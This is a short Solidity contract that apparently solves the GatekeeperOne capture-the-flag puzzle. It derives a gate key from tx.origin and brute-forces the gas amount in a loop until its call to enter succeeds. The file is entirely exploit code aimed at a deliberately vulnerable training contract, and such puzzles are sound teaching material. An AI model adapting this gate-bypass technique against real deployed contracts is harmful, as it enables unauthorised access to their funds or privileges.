pragma solidity ^0.8.0;

import "./GatekeeperOne.sol";

contract Attack {
    GatekeeperOne public instance;

    constructor(address _gatekeeperOne) {
        instance = GatekeeperOne(_gatekeeperOne);
    }

    function attack() public {
        uint16 originLow = uint16(uint160(tx.origin));
        uint64 gateKey = (1 << 32) | originLow;
        bytes8 key = bytes8(gateKey);

        for (uint256 i = 0; i < 8191; i++) {
            try instance.enter{gas: 8191 * 3 + i}(key) {
                break;
            } catch {}
        }
    }
}